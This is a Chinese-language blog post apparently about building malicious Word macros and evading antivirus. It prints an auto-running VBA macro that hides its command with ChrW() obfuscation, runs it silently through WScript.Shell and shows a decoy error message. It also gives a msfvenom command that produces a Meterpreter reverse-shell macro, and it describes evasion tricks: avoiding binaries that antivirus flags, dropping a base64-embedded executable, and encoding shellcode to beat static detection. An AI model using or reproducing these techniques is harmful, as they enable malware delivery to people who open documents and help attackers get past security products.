---
layout: post
title:  "恶意宏文档与免杀"
date:   2019-12-3 12:48:05 +0800
categories: apt
---
# 生成执行cmd的宏

项目地址 https://github.com/metac0rtex/Office-Macro-Generator

生成示例:

```vb
Public Sub AutoOpen()
  Dim cmd As String
  BxJnb = ChrW(99) & ChrW(115) & ChrW(99) & ChrW(114) & ChrW(105) & ChrW(112) & ChrW(116) & ChrW(32) & ChrW(68) & ChrW(58)
  SAnJV = ChrW(92) & ChrW(116) & ChrW(101) & ChrW(115) & ChrW(116) & ChrW(49) & ChrW(49) & ChrW(49) & ChrW(46) & ChrW(118)
  JKkJK = ChrW(98) & ChrW(115)
  cmd = BxJnb & SAnJV & JKkJK
  Dim Obj as Object
  Set Obj = CreateObject("WScript.Shell")
  Obj.Run cmd, 0
  MsgBox ("Required rescource could not be allocated")
End Sub
  cmd = cmd & "cscript D:\test111.vbs"
```

主要就是使用ChrW()拼接成cmd，然后通过调用WScript.Shell执行命令

类似项目：

https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator 

https://github.com/infosecn1nja/MaliciousMacroMSBuild

# 使用msf生成宏

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f vba -o try.vba
```

使用msf生成vba代码，放入word中即可。

msf生成的宏使用shellcode动态加载技术，运行时在内存中注入shellcode并执行

# 免杀

灵活运用base64就可以达到免杀的效果，此处只讲解原理并提供思路。

## cmd宏的免杀

执行cmd本身不会引起杀软的注意，但是当进行敏感操作时杀软就会警告（如调用powershell、cscript、wscript、bitsadmin、certutil等），因此执行命令时应该避开调用这些程序。

以火绒为例:

![火绒](https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20191203141834.png)

思路：

将免杀的exe进行base64编码写入代码中，当宏执行时释放exe并运行。

## 基于动态加载shellcode的宏的免杀

最开始尝试直接使用veil混淆过的shellcode进行免杀，但是并没有达到效果。

https://payloads.online/archivers/2019-05-16/1 倾旋在博客中提过将shellcode通过自增等操作进行混淆。

根据这个思路，我们可以将shellcode进行base64编码，运行的时候再将编码后的shellcode还原。

## 思路拓展

base64编码本质上是一种加密过程，将payload视为明文，通过编码的得到密文，在程序运行时再讲密文还原为明文，以此来绕过杀软的静态检测。如果可以自己实现一种加密方式，就可以达到很好的免杀效果。